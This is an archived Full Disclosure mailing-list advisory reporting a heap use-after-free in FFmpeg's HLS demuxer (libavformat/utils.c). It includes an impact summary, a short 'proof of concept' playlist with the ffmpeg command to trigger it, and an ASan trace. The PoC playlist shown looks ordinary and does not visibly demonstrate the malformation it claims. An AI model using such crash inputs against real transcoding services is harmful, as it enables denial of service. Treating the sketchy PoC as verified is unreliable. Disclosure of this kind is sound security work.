---
title: FFmpeg 7.0+ Heap Use-After-Free in FFmpeg HLS Demuxer	(libavformat/utils.c)
url: https://seclists.org/fulldisclosure/2025/Sep/25
source: Full Disclosure
date: 2025-09-09
fetch_date: 2025-10-02T19:53:04.984342
---

# FFmpeg 7.0+ Heap Use-After-Free in FFmpeg HLS Demuxer	(libavformat/utils.c)

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](24)
[By Date](date.html#25)
[![Next](/images/right-icon-16x16.png)](26)

[![Previous](/images/left-icon-16x16.png)](24)
[By Thread](index.html#25)
[![Next](/images/right-icon-16x16.png)](26)

![](/shared/images/nst-icons.svg#search)

# FFmpeg 7.0+ Heap Use-After-Free in FFmpeg HLS Demuxer (libavformat/utils.c)

---

*From*: Ron E <ronaldjedgerson () gmail com>
*Date*: Sun, 7 Sep 2025 01:31:45 -0400

---

```
Malformed .m3u8 playlists can trigger a heap use-after-free when the HLS
demuxer handles segment references. ASan reports access to freed memory
inside libavformat/utils.c:528. A crafted .m3u8 could allow remote
attackers to achieve denial of service (DoS), information disclosure, or
potentially remote code execution depending on heap state. (FFmpeg 7.0-8.0)

*Impact:*

   -

   Remote attackers can crash the transcoder with a malicious playlist.
   -

   Under certain heap layouts, this may be exploitable for arbitrary code
   execution.

*Proof of Concept:*
#EXTM3U
#EXTINF:10,
dummy.ts

UBSAN_OPTIONS=print_stacktrace=1 ASAN_OPTIONS=abort_on_error=1 ./ffmpeg -i
malicious.m3u8 -c copy out.mp4

ERROR: AddressSanitizer: heap-use-after-free on address 0x5080000000c8
READ of size 4
freed by thread T0 here: free()
previously allocated by thread T0 here: posix_memalign()
_______________________________________________
Sent through the Full Disclosure mailing list
https://nmap.org/mailman/listinfo/fulldisclosure
Web Archives & RSS: https://seclists.org/fulldisclosure/
```

---

[![Previous](/images/left-icon-16x16.png)](24)
[By Date](date.html#25)
[![Next](/images/right-icon-16x16.png)](26)

[![Previous](/images/left-icon-16x16.png)](24)
[By Thread](index.html#25)
[![Next](/images/right-icon-16x16.png)](26)

### Current thread:

* **FFmpeg 7.0+ Heap Use-After-Free in FFmpeg HLS Demuxer (libavformat/utils.c)** *Ron E (Sep 08)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")